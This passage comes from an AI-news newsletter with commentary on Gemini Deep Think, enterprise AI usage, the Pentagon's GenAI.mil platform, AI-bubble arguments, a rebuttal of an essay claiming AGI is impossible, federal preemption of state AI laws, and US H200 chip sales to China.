Opus 4.5 is missing from their slides (thanks <a href=\"https://x.com/kavhnr/status/1996718619607322868\">Kavin</a> for fixing this), on the other hand I get it, life comes at you fast and the core point still stands.</p>\n<blockquote><p><a href=\"https://x.com/demishassabis/status/1996683917991334300\">Demis Hassabis:</a> With its parallel thinking capabilities it can tackle highly complex maths &amp; science problems &#8211; enjoy!</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!iCdu!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F05dab39c-5a91-4302-8efe-1a8e3fb4579b_900x391.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n</blockquote>\n<p>I presume, based on previous experience with Gemini 2.5 Deep Think, that if you want the purest thinking and \u2018raw G\u2019 mode that this is now your go-to.</p>\n\n\n<h4 class=\"wp-block-heading\">In Other AI News</h4>\n\n\n<p><a href=\"https://deepmind.google/blog/deepening-our-partnership-with-the-uk-ai-security-institute/\">DeepMind expands its partnership with UK AISI</a> to share model access, issue joint reports, do more collaborative safety and security research and hold technical discussions.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!y3_L!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbecb6ec3-4973-4546-b66d-d11ed98b6e45_430x120.png\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>OpenAI gives us <a href=\"https://openai.com/index/the-state-of-enterprise-ai-2025-report/\">The State of Enterprise AI</a>. Usage is up, as in way up, as in 8x message volumes and 320x reasoning token volumes, and workers and employees surveyed reported productivity gains. A lot of this is essentially new so thinking about multipliers on usage is probably not the best way to visualize the data.</p>\n<p><a href=\"https://openai.com/index/strengthening-cyber-resilience/\">OpenAI post explains their plans to strengthen cyber resilience</a>, with the post reading like AI slop without anything new of substance. GPT-5.1 thinks the majority of the text comes from itself. <a href=\"https://www.youtube.com/watch?v=1GiPcP30cFc\">Shame.</a></p>\n<p><a href=\"https://www.anthropic.com/news/anthropic-accenture-partnership\">Anthropic partners with Accenture</a>. Anthropic claims 40% enterprise market share.</p>\n<p><a href=\"https://x.com/AndrewCurran_/status/1998368254990155906\">I almost got even less of a break:</a> <a href=\"https://www.cnbc.com/2025/12/09/meta-avocado-ai-strategy-issues.html\">Meta\u2019s Llama successor, codenamed Avocado, was reportedly pushed back from December into Q1 2026</a>. It sounds like they\u2019re quietly questioning their open source approach as capabilities advance, as I speculated and hoped they might.</p>\n<p>We now write largely for the AIs, both in terms of training data and when AIs use search as part of inference. <a href=\"https://x.com/deanwball/status/1998740656793976951\">Thus the strong reactions and threats to leave Substack when an incident suggested that Substack might be blocking</a> AIs from accessing its articles. I have not experienced this issue, ChatGPT and Claude are both happily accessing Substack articles for me, including my own. If that ever changes, remember that there is a mirror on WordPress and another on LessWrong.</p>\n<p>The place that actually does not allow access is Twitter, I presume in order to give an edge to Grok and xAI, and this is super annoying, often I need to manually copy Twitter content. This substantially reduces the value of Twitter.</p>\n<p><a href=\"https://manthanguptaa.in/posts/chatgpt_memory/\">Manthan Gupta analyzes how OpenAI memory works</a>, essentially inserting the user facts and summaries of recent chats into the context window. That means memory functions de facto as additional custom system instructions, so use it accordingly.</p>\n\n\n<h4 class=\"wp-block-heading\">This Means War</h4>\n\n\n<p><a href=\"https://x.com/DanielleFong/status/1998436812096963008\">Secretary of War Pete Hegseth</a>, who has reportedly been known to issue the order \u2018kill them all\u2019 without a war or due process of law, has new plans.</p>\n<blockquote><p>Pete Hegseth (Secretary of War): Today, we are unleashing GenAI.mil</p>\n<p>This platform puts the world\u2019s most powerful frontier AI models directly into the hands of every American warrior.</p>\n<p>We will continue to aggressively field the world\u2019s best technology to make our fighting force more lethal than ever</p>\n<p>Department of War: The War Department will be AI-first.</p>\n<p>GenAI.mil puts the most cutting edge AI capabilities into the hands of 3 million @DeptofWar personnel.</p>\n<p><a href=\"https://x.com/unusual_whales/status/1998572876962959628\">Unusual Whales:</a> Pentagon has been ordered to form an AI steering committee on AGI.</p>\n<p>Danielle Fong: man, AI and lethal do not belong in the same sentence.</p></blockquote>\n<p>This is inevitable, and also a good thing given the circumstances. We do not have the luxury of saying AI and lethal do not belong in the same sentence, if there is one place we cannot pause this would be it, and the threat to us is mostly orthogonal to the literal weapons themselves while helping people realize the situation. Hence my longstanding position in favor of building the Autonomous Killer Robots, and very obviously we need AI assisting the war department in other ways.</p>\n<p>If that\u2019s not a future you want, you need to impact AI development in general. Trying to specifically not apply it to the War Department is a non-starter.</p>\n\n\n<h4 class=\"wp-block-heading\">Show Me the Money</h4>\n\n\n<p><a href=\"https://www.bloomberg.com/news/articles/2025-12-04/meta-s-zuckerberg-plans-deep-cuts-for-metaverse-efforts?srnd=homepage-americas\">Meta plans deep cuts in Metaverse efforts</a>, stock surges.</p>\n<p>The stock market continues to punish companies linked to OpenAI, with many worried that Google is now winning, despite events being mostly unsurprising. An \u2018efficient market\u2019 can still be remarkably time inconsistent, if it can\u2019t be predicted.</p>\n\n\n<h4 class=\"wp-block-heading\">Bubble, Bubble, Toil and Trouble</h4>\n\n\n<p><a href=\"https://www.persuasion.community/p/theres-an-ai-bubble-for-real?utm_campaign=post-expanded-share&amp;utm_medium=web&amp;triedRedirect=true\">Jerry Kaplan calls it an AI bubble</a>, purely on priors:</p>\n<ol>\n<li>Technologies take time to realize real gains.</li>\n<li>There are many AI companies, we should expect market concentration.</li>\n<li>Concerns about Chinese electricity generation and chip development.</li>\n<li>Yeah, yeah, you say \u2018this time is different,\u2019 never is, sorry.</li>\n<li>OpenAI and ChatGPT\u2019s revenue is 75% subscriptions.</li>\n<li>The AI companies will need to make a lot of money.</li>\n</ol>\n<p>Especially amusing is the argument that \u2018OpenAI makes its money on subscriptions not on business income,\u2019 therefore all of AI is a bubble, when Anthropic is the one dominating the business use case. If you want to go long Anthropic and short OpenAI, that\u2019s hella risky but it\u2019s not a crazy position.</p>\n<p>Seeing people call it a bubble on the basis of such heuristics should update you towards it being less of a bubble. You know who you are trading against.</p>\n<blockquote><p><a href=\"https://x.com/mattyglesias/status/1997703226293149915\">Matthew Yglesias</a>: The AI investment boom is driven by genuine increases in revenue.</p>\n<p>\u201cEvery year for the past 3 years, Anthropic has grown revenue by 10x. $1M to $100M in 2023, $100M to $1B in 2024, and $1B to $10B in 2025\u201d</p>\n<p><a href=\"https://x.com/paulg/status/1997707071320646120\">Paul Graham</a>: The AI boom is definitely real, but this may not be the best example to prove it. A lot of that increase in revenue has come directly from the pockets of investors.</p></blockquote>\n<p>Paul\u2019s objection is a statement about what is convincing to skeptics.</p>\n<p>If you\u2019re paying attention, you\u2019d say: So what, if the use and revenue are real?</p>\n<p>Your investors also being heavy users of your product is an excellent sign, if the intention is to get mundane utility from the product and not manipulative. In the case of Anthropic, it seems rather obvious that the $10 billion is not an attempt to trick us.</p>\n<p>However, a lot of this is people looking at heuristics that superficially look sus. To defeat such suspicions, you need examples immune from such heuristics.</p>\n<p>&nbsp;</p>\n\n\n<h4 class=\"wp-block-heading\">Quiet Speculations</h4>\n\n\n<p>Derek Thompson, in his 26 ideas for 2026, <a href=\"https://www.derekthompson.org/i/175555927/ai-is-eating-the-economy-it-will-soon-dominate-politics-too\">says AI is eating the economy and will soon dominate politics</a>, including a wave of anti-AI populism. Most of the post is about economic and cultural conditions more broadly, and how young people are in his view increasingly isolated, despairing and utterly screwed.</p>\n<p><a href=\"https://x.com/ShanuMathew93/status/1996638652747657613\">New Princeton and Camus Energy study suggests</a> flexible grid connections and BYOC cut data center interconnection down to ~2 years and can solve the political barriers. I note that 2 years is still a long time, and that the hyperscalers are working faster than that by not trying to get grid connections.</p>\n<p><a href=\"https://arnoldkling.substack.com/p/ai-links\">Arnold Kling reminds me of a quote I didn\u2019t pay enough attention to the first time</a>:</p>\n<blockquote><p>Dwarkesh Patel: Models keep getting more impressive at the rate the short timelines people predict, but more useful at the rate the long timelines people predict.</p></blockquote>\n<p>I would correct \u2018more useful\u2019 to \u2018provides value to people,\u2019 as I continue to believe a lot of the second trend is a skill issue and people being slow to adjust, but sure.</p>\n<p>Something\u2019s gotta give. Sufficiently advanced AI would be highly additionally used.</p>\n<ol>\n<li>If the first trend continues, the second trend will accelerate.</li>\n<li>If the second trend continues, the first trend will stop.</li>\n</ol>\n\n\n<h4 class=\"wp-block-heading\">Impossible</h4>\n\n\n<p>I mention this one because <a href=\"https://x.com/sriramk/status/1998813859713528222\">Sriram Krishnan pointed</a> to it: <a href=\"https://timdettmers.com/2025/12/10/why-agi-will-not-happen/\">There is a take by Tim Dettmers that AGI will \u2018never\u2019 happen</a> because \u2018computation is physical\u2019 and AI systems have reached their physical limits the same way humans have (due to limitations due to the requirements of pregnancy, wait what?), and transformers are optimal the same way human brains are, together with the associated standard half-baked points that self-improvement requires physical action and so on.</p>\n<p>It also uses an AGI definition that includes \u2018solving robotics\u2019 to help justify this, although I expect robotics to get \u2018solved\u2019 within a few decades at most even without recursive self-improvement. The post even says that scaling improvements in 2025 were \u2018not impressive\u2019 as evidence that we are hitting permanent limits, a claim that has not met 2025 or how permanent limits work.</p>\n<p><a href=\"https://x.com/boazbaraktcs/status/1998954218346918317\">Boaz Barak of OpenAI tries to be polite</a> about there being some good points, while emphasizing (in nicer words than I use here) that it is absurdly absolute and the conclusion makes no sense. This follows in a long tradition of \u2018whelp, no more innovations are possible, guess we\u2019re at the limit, let\u2019s close the patent office.\u2019</p>\n<blockquote><p><a href=\"https://x.com/deanwball/status/1999102927516942707\">Dean Ball</a>: My entire rebuttal to Dettmers here could be summarized as \u201che extrapolates valid but narrow technical claims way too broadly with way too much confidence,\u201d which is precisely what I (and many others) critique the ultra-short timelines people for.</p>\n<p><a href=\"https://x.com/yonashav/status/1999108135332569177\">Yo Shavit (OpenAI)</a>: I am glad Tim\u2019s sharing his opinion, but I can\u2019t help but be disappointed with the post &#8211; it\u2019s a lot of claims without any real effort to justify them engage with counterpoints.<br />\n(A few examples: claiming the transformer arch is near-optimal when human brains exist; ignoring that human brain-size limits due to gestational energy transfer are exactly the kind of limiter a silicon system won\u2019t be subject to; claiming that outside of factories, robotic automation of the economy wouldn\u2019t be that big a deal because there isn\u2019t much high value stuff to do.)</p>\n<p>It seems like this piece either needs to cite way more sources to others who\u2019ve made better arguments, or make those arguments himself, or just express that this essay is his best guess based on his experiences and drop the pretense of scientific deduction.</p></blockquote>\n<p>Gemini 3\u2019s analysis here was so bad, both in terms of being pure AI slop and also buying some rather obviously wrong arguments, that I lost much respect for Gemini 3. Claude Opus 4.5 and GPT-5.1 did not make that mistake and spot how absurd the whole thing is. It\u2019s kind of hard to miss.</p>\n\n\n<h4 class=\"wp-block-heading\">Can An AI Model Be Too Much?</h4>\n\n\n<p>I would answer yes, in the sense that if you build a superintelligence that then kills everyone or takes control of the future that was probably too much.</p>\n<p>But some people are saying that Claude Opus 4.5 is or is close to being \u2018too much\u2019 or \u2018too good\u2019? As in, it might make their coding projects finish too quickly and they won\u2019t have any chill and They Took Our Jobs?</p>\n<p>Or is it that it\u2019s bumping up against \u2018this is starting to freak me out\u2019 and \u2018I don\u2019t want this to be smarter than a human\u2019? We see a mix of both here.</p>\n<blockquote><p><a href=\"https://x.com/ivanfioravanti/status/1996452061660188818\">Ivan Fioravanti</a>: Opus 4.5 is too good to be true. I think we\u2019ve reached the \u201cmore than good enough\u201d level; everything beyond this point may even be too much.</p>\n<p>John-Daniel Trask: We\u2019re on the same wave length with this one Ivan. Just obliterating the roadmap items.</p>\n<p>Jay: Literally can do what would be a month of work in 2022 in 1 day. Maybe more.</p>\n<p><a href=\"https://x.com/repligate/status/1996671946789212571\">Janus</a>: I keep seeing versions of this sentiment: the implication that more would be \u201ctoo much\u201d. I\u2019m curious what people mean &amp; if anyone can elaborate on the feeling</p>\n<p>Hardin: \u201cMy boss might start to see the Claude Max plan as equal or better ROI than my salary\u201d most likely.</p>\n<p>Singer: I resonate with this. It\u2019s becoming increasingly hard to pinpoint what frontier models are lacking. Opus 4.5 is beautiful, helpful, and knowledgeable in all the ways we could demand of it, without extra context or embodiment. What does \u2018better than this\u2019 even mean?</p></blockquote>\n<p>&nbsp;</p>\n\n\n<h4 class=\"wp-block-heading\">Try Before You Tell People They Cannot Buy</h4>\n\n\n<p><a href=\"https://x.com/kevinroose/status/1996661616268792114\">Last week had the fun item</a> that only recently did Senator Josh Hawley bother to try out ChatGPT one time.</p>\n<blockquote><p>Bryan Metzger (Business Insider) on December 3, 2025: Sen. Josh Hawley, one of the biggest AI critics in the Senate, told me this AM that he recently decided to try out ChatGPT.</p>\n<p>He said he asked a \u201cvery nerdy historical question\u201d about the \u201cPuritans in the 1630s.\u201d</p>\n<p>\u201cI will say, it returned a lot of good information.\u201d</p>\n<p>Hawley took a much harder line on this over the summer, telling me: \u201cI don\u2019t trust it, I don\u2019t like it, I don\u2019t want it being trained on any of the information I might give it.\u201d</p>\n<p>He also wants to ban driverless cars and ban people under 18 from using AI.</p>\n<p>Senator Josh Hawley: Oh, no [I am not changing my tune on AI]. I mean listen, I think that if people want to, adults want to use AI to do research or whatever, that\u2019s fine. The bigger issue is not any one individual\u2019s usage. It is children, number one, and their safety, which is why we got to ban chatbots for minors. And then it\u2019s the overall effects in the marketplace, with displacing whole jobs. That, to me, is the big issue.</p></blockquote>\n<p>The news is not that Senator Hawley had never tried ChatGPT. He told us that back in July. The news is that:</p>\n<ol>\n<li>Senator Hawley has now tried ChatGPT once.</li>\n<li>People only now are realizing he had never tried it before.</li>\n</ol>\n<p>Senator Hawley really needs to try LLMs, many of them and a lot more than once, before trying to be a major driver of AI regulations.</p>\n<p>But also it seems like malpractice for those arguing against Hawley to only realize this fact about Hawley this week, as opposed to back in the summer, given the information was in Business Insider in July, and to have spent this whole time not pointing it out?</p>\n<blockquote><p>Kevin Roose (NYT): had to check the date on this one.</p>\n<p>i have stopped being shocked when AI pundits, people who think and talk about AI for a living, people who are *writing and sponsoring AI legislation* admit that they never use it, because it happens so often. but it is shocking!</p>\n<p><a href=\"https://x.com/paulg/status/1996660289140638175\">Pau Graham</a>: How can he be a \u201cbig AI critic\u201d and not have even tried ChatGPT till now? He has less experience of AI than the median teenager, and he feels confident enough to talk about AI policy?</p>\n<p>Yes [I was] genuinely surprised.</p></blockquote>\n\n\n<h4 class=\"wp-block-heading\"></h4>\n\n\n<p>&nbsp;</p>\n\n\n<h4 class=\"wp-block-heading\">The Quest for Sane Regulations</h4>\n\n\n<p>A willingness to sell H200s to China is raising a lot of supposedly answered questions.</p>\n<blockquote><p><a href=\"https://x.com/ModeledBehavior/status/1998483967696343352\">Adam Ozimek:</a> If your rationalization of the trade war was that it was necessary to address the geopolitical threat of China, I think it is time to reconsider.</p>\n<p><a href=\"https://x.com/michaelsobolik/status/1998094183165571334\">Michael Sobolik</a> (on the H200 sales): In what race did a runner win by equipping an opponent? In what war had a nation ever gained decisive advantage by arming its adversary? This is a mistake.</p>\n<p><a href=\"https://x.com/Kyle_A_Morse/status/1998373957003771976\">Kyle Morse</a>: Proof that the Big Tech lobby\u2019s \u201cnational security\u201d argument was always a hoax.</p></blockquote>\n<p>David Sacks and some others tried to recast the \u2018AI race\u2019 as \u2018market share of AI chips sold,\u2019 but people retain common sense and are having none of this.</p>\n<p>House Select Committee on China supports <a href=\"https://x.com/ChinaSelect/status/1996345533896826918\">the bipartisan Stop Stealing Our Chips Act</a>, which <a href=\"https://selectcommitteeontheccp.house.gov/media/press-releases/moolenaar-backs-legislation-to-incentivize-whistleblowers-to-sound-alarm-on-chip-smuggling\">creates an Export Compliance Accountability Fund for whistleblowers</a>. I haven\u2019t done a full RTFB but if the description is accurate then we should pass this.</p>\n\n\n<h4 class=\"wp-block-heading\">The Chinese Are Smart And Have A Lot Of Wind Power</h4>\n\n\n<p>It would help our AI efforts if we were equally smart and used all sources of power.</p>\n<blockquote><p><a href=\"https://x.com/atrupar/status/1998552050808897769\">Donald Trump</a>: China has very few wind farms. You know why? Because they\u2019re smart. You know what they do have? A lot of coal &#8230; we don\u2019t approve windmills.</p>\n<p><a href=\"https://x.com/nicolasfulghum/status/1998655486129045626\">Nicolas Fulghum</a>: This is of course false.</p>\n<p>China is the #1 generator of electricity from wind globally with over 2x more than #2 &#8230; the United States.</p>\n<p>In the US, wind already produces ~2x more electricity than hydro. It could be an important part of a serious plan to meet AI-driven load growth.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!i9X6!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b20f471-f4b5-4140-a0b2-91182bb1f433_1085x869.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n</blockquote>\n\n\n<h4 class=\"wp-block-heading\"></h4>\n\n\n<p>&nbsp;</p>\n\n\n<h4 class=\"wp-block-heading\">White House To Issue AI Executive Order</h4>\n\n\n<p>The Congress rejected preemption once again, so <a href=\"https://x.com/DavidSacks/status/1998125180753944985\">David Sacks announced the White House is going to try and do some of it via Executive Order</a>, <a href=\"https://www.bloomberg.com/news/articles/2025-12-08/trump-says-he-ll-sign-executive-order-curbing-state-ai-rules\">which Donald Trump confirmed</a>.</p>\n<blockquote><p>David Sacks: ONE RULEBOOK FOR AI.</p></blockquote>\n<p>What is that rulebook?</p>\n<p>A blank sheet of paper.</p>\n<p>There is no \u2018federal framework.\u2019 There never was.</p>\n<p>This is an announcement that AI preemption will be fully without replacement.</p>\n<p>Their offer is nothing. 100% nothing. Existing non-AI law technically applies. That\u2019s it.</p>\n<p>Sacks\u2019s argument is, essentially, that state laws are partisan, and we don\u2019t need laws.</p>\n<p>Here is the part that matters and is actually new, the \u20184 Cs\u2019:</p>\n<blockquote><p>David Sacks: But what about the 4 C\u2019s? Let me address those concerns:</p>\n<p>1. Child safety &#8211; Preemption would not apply to generally applicable state laws. So state laws requiring online platforms to protect children from online predators or sexually explicit material (CSAM) would remain in effect.</p>\n<p>2. Communities &#8211; AI preemption would not apply to local infrastructure. That\u2019s a separate issue. In short, preemption would not force communities to host data centers they don\u2019t want.</p>\n<p>3. Creators &#8211; Copyright law is already federal, so there is no need for preemption here. Questions about how copyright law should be applied to AI are already playing out in the courts. That\u2019s where this issue will be decided.</p>\n<p>4. Censorship &#8211; As mentioned, the biggest threat of censorship is coming from certain Blue States. Red States can\u2019t stop this \u2013 only President Trump\u2019s leadership at the federal level can.</p>\n<p>In summary, we\u2019ve heard the concerns about the 4 C\u2019s, and the 4 C\u2019s are protected.</p>\n<p>But there is a 5th C that we all need to care about: competitiveness. If we want America to win the AI race, a confusing patchwork of regulation will not work.</p></blockquote>\n<p>Sacks wants to destroy any and all attempts to require transparency from frontier model developers, or otherwise address frontier safety concerns. He\u2019s not even willing to give lip service to AI safety. At all.</p>\n<p>His claim that \u2018the 4Cs are protected\u2019 is also absurd, of course.</p>\n<p>I do not expect this attitude to play well.</p>\n<p><a href=\"https://x.com/BradWilcoxIFS/status/1996655133426643156\">AI preemption of state laws is deeply unpopular</a>, we have numbers via Brad Wilcox:</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!JdzZ!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa25ac907-e6c5-4cbd-bdb6-4cdad5b3f254_900x496.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!xHIp!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0dfaa22e-c5a8-41e8-839a-7860a89fef16_900x434.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>Also, yes, someone finally made the correct meme.</p>\n<blockquote><p>Peter Wildeford: The entire debate over AI pre-emption is a huge trick.</p>\n<p>I do prefer one national law over a \u201cpatchwork of state regulation\u201d. But that\u2019s not what is being proposed. The \u201cnational law\u201d part is being skipped. It\u2019s just stopping state law and replacing it with nothing.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!q5zP!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F302f6ef5-62d4-497c-baea-4c344e2753a5_900x386.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n</blockquote>\n<p>That is with the obligatory \u2018<a href=\"https://www.hyperdimensional.co/p/be-it-enacted\">Dean Ball offered a serious proposed federal framework that could be the basis of a win-win negotiation</a>.\u2019 He totally did do that, which was great, but none of the actual policymakers have shown any interest.</p>\n<p>The good news is that I also do not expect the executive order to curtail state laws. The constitutional challenges involved are, according to my legal sources, extremely weak. Similar executive orders have been signed for climate change, and seem to have had no effect. The only part likely to matter is the threat to withhold funds, which is limited in scope, very obviously not the intent of the law Trump is attempting to leverage, and highly likely to be ruled illegal by the courts.</p>\n<p>The point of the executive order is not to actually shut down the state laws. The point of the executive order is that this administration hates to lose, and this is a way to, in their minds, save some face.</p>\n<p>It is also now, in the wake of the H200, far more difficult to play the \u2018cede ground to China\u2019 card, these are the first five responses to Cruz in order and the pattern continues, with a side of those defending states rights and no one supporting Cruz:</p>\n<blockquote><p><a href=\"https://x.com/SenTedCruz/status/1998523468925583772\">Senator Ted Cruz </a>(R-Texas): Those disagreeing with President Trump on a nationwide approach to AI would cede ground to China.</p>\n<p>If China wins the AI race, the world risks an order built on surveillance and coercion. The President is exactly right that the U.S. must lead in AI and cannot allow blue state regulation to choke innovation and stifle free speech.</p>\n<p>OSINTdefender: You mean the same President Trump who just approved the sale of Nvidia\u2019s AI Chips to China?</p>\n<p>petebray: Ok and how about chips to China then?</p>\n<p>Brendan Steinhauser: Senator, with respect, we cannot beat China by selling them our advanced chips.</p>\n<p>Would love to see you speak out against that particular policy.</p>\n<p>Lawrence Colburn: Why, then, would Trump approve the sale of extremely valuable AI chips to China?</p>\n<p>Mike in Houston: Trump authorized NVDIA sales of their latest generation AI chips to China (while taking a 25% cut). He\u2019s already ceding the field in a more material way than state regulations\u2026 and not a peep from any of you GOP AI &amp; NatSec \u201chawks. Take a seat.</p></blockquote>\n<p>&nbsp;</p>\n\n\n<h4 class=\"wp-block-heading\">H200 Sales Fallout Continued</h4>\n\n\n<p><a href=\"https://x.com/ChinaSelect/status/1998398247656706429\">The House Select Committee on China is not happy about the H200 sales</a>. The question, as the comments ask, is what is Congress going to do about it?</p>\n<p>The good news is that it looks like <a href=\"https://x.com/Megatron_ron/status/1998462554335543296\">the Chinese are once again going to try and save us from ourselves one more time</a>?</p>\n<blockquote><p>Megatron: China refuses to accept Nvidia chips</p>\n<p>Despite President Trump authorizing the sale of Nvidia H200 chips to China, China refuses to accept them and increase restrictions on their use &#8211; Financial Times.</p>\n<p><a href=\"https://x.com/teortaxesTex/status/1998579354100728234\">Teortaxes</a>: No means NO, chud</p></blockquote>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!-666!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2afecfc4-a6cd-4e7b-a882-355429838f70_852x552.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>Well, somewhat.</p>\n<blockquote><p><a href=\"https://archive.is/X21pm\">Zijing Wu (Financial Times):</a> Buyers would probably be required to go through an approval process, the people said, submitting requests to purchase the chips and explaining why domestic providers were unable to meet their needs. The people added that no final decision had been made yet.</p>\n<p>Reuters: yteDance and Alibaba <a href=\"https://www.reuters.com/markets/companies/9988.HK\">(9988.H</a>yteDance and Alibaba <a href=\"https://www.reuters.com/markets/companies/9988.HK\">(9988.HK), opens new tab</a> have asked Nvidia <a href=\"https://www.reuters.com/markets/companies/NVDA.O\">(NVDA.O), opens new tab</a> about buying its powerful H200 AI chip after U.S. President Donald Trump said he would <a href=\"https://www.reuters.com/world/china/us-open-up-exports-nvidia-h200-chips-china-semafor-reports-2025-12-08/\">allow it to be exported to China</a>, four people briefed on the matter told Reuters.<a href=\"https://www.reuters.com/markets/companies/9988.HK\">K), opens new tab</a> have asked Nvidia <a href=\"https://www.reuters.com/markets/companies/NVDA.O\">(NVDA.O), opens new tab</a> about buying its powerful H200 AI chip after U.S. President Donald Trump said he would <a href=\"https://www.reuters.com/world/china/us-open-up-exports-nvidia-h200-chips-china-semafor-reports-2025-12-08/\">allow it to be exported to China</a>, four people briefed on the matter told Reuters.</p>\n<p>\u2026</p>\n<p>The officials told the companies they would be informed of Beijing\u2019s decision soon, The Information said, citing sources.</p>\n<p>Very limited quantities of H200 are currently in production, two other people familiar with Nvidia\u2019s supply chain said, as the U.S. chip giant has been focused instead on its most advanced Blackwell and upcoming Rubin lines.</p></blockquote>\n<p>The purchases are expected to <a href=\"https://x.com/jukan05/status/1998722427430514981?s=46&amp;t=NB8nSpqnHJMAhZHskh5F2g\">be in a \u2018low key manner</a>\u2019 but done in size, although the number of H200s currently in production could become another limiting factor.</p>\n<p>Why is PCR so reluctant, never mind what its top AI labs might say?</p>\n<p><a href=\"https://x.com/DeItaone/status/1998738373326844298?t=bq2cPhJS0xOFY4qX8aXyGg&amp;s=19\">Maybe it\u2019s because they\u2019re too busy smuggling Blackwells?</a></p>\n<blockquote><p><a href=\"https://x.com/theinformation/status/1998758394946039861?s=46&amp;t=NB8nSpqnHJMAhZHskh5F2g\">The Information</a>: Exclusive: DeepSeek is developing its next major AI model using Nvidia\u2019s Blackwell chips, which the U.S. has forbidden from being exported to China.</p></blockquote>\n<p>Maybe it\u2019s because the Chinese are understandably worried about <a href=\"https://www.wsj.com/tech/ai/nvidia-ai-chips-to-undergo-unusual-u-s-security-review-before-export-to-china-5e73cd55?st=X9HwLX&amp;mod=djemwhatsnews\">what happens when all those H200 chips go to America first for \u2018special security reviews</a>,\u2019 or America restricting which buyers can purchase the chips. Maybe it\u2019s the (legally dubious) 25% cut. Maybe it\u2019s about dignity. Maybe they are emphasizing self-reliance and don\u2019t understand the trade-offs and what they\u2019re sacrificing.</p>\n<p>My guess is this is the kind of high-level executive decision where Xi says \u2018we are going to rely on our own domestic chips, the foreign chips are unreliable\u2019 and this becomes a stop sign that carries the day. It\u2019s a known weakness of authoritarian regimes and of China in particular, to focus on high level principles even in places where it tactically makes no sense.</p>\n<p>Maybe China is simply operating on the principle that if we are willing to sell, there is a reason, so they should refuse to buy.</p>\n<p>No matter which one it is? You love to see it.</p>\n<p>If we offer to sell, and they say no, then that\u2019s a small net win. It\u2019s not that big of a win versus not making the mistake in the first place, and it risks us making future mistakes, but yeah if you can \u2018poison the pill\u2019 sufficiently that the Chinese refuse it, then that\u2019s net good.</p>\n<p>The big win would be if this causes the Chinese to crack down on chip smuggling. If they don\u2019t want to buy the H200s straight up, perhaps they shouldn\u2019t want anyone smuggling them either?</p>\n<p><a href=\"https://stratechery.com/2025/trump-allows-h200-sales-to-china-the-sliding-scale-a-good-decision/?access_token=eyJhbGciOiJSUzI1NiIsImtpZCI6InN0cmF0ZWNoZXJ5LnBhc3Nwb3J0Lm9ubGluZSIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJzdHJhdGVjaGVyeS5wYXNzcG9ydC5vbmxpbmUiLCJhenAiOiJIS0xjUzREd1Nod1AyWURLYmZQV00xIiwiZW50Ijp7InVyaSI6WyJodHRwczovL3N0cmF0ZWNoZXJ5LmNvbS8yMDI1L3RydW1wLWFsbG93cy1oMjAwLXNhbGVzLXRvLWNoaW5hLXRoZS1zbGlkaW5nLXNjYWxlLWEtZ29vZC1kZWNpc2lvbi8iXX0sImV4cCI6MTc2Nzk1NjcxNCwiaWF0IjoxNzY1MzY0NzE0LCJpc3MiOiJodHRwczovL2FwcC5wYXNzcG9ydC5vbmxpbmUvb2F1dGgiLCJzY29wZSI6ImZlZWQ6cmVhZCBhcnRpY2xlOnJlYWQgYXNzZXQ6cmVhZCBjYXRlZ29yeTpyZWFkIGVudGl0bGVtZW50cyIsInN1YiI6IjAxOTY0MGE3LTNjYzUtNzc1My04MzY4LWZiMjg5MTI0Y2YxMyIsInVzZSI6ImFjY2VzcyJ9.pXZXlOaLIvjlPzxxGRrjFr7zx1cdT2Si_oi8vDnjvj8hGceJp376VJkLtAfrMb9-cUH8ZPjRBLqIC33DlslTUR3MTVnk0sL3bE4cW4G3tCnru59cevulyEOmVjkT_3XAkTfo_znjpRiD54reHw_6qnGf2OP9_M1DpFXOKcWxJLBcyhpkA5hpSlpLRRLauCMOSGrohcqD_by-Ci_xfrJdaSqrTR3T8mdttHgYnbf9gWrAAYCHep-B6OPSEG1QUcsoEfiQe8AVSYh1kxuaRHnH6PIexh4e63xYNTs0umdeJUQ_KDH6_dYSy-UEzoHjO8-wZCl2vTmSREP0_UvBi90Oyw\">Ben Thompson as expected takes the position defending H200 sales</a>, because giving America an advantage over China is a bad thing and we 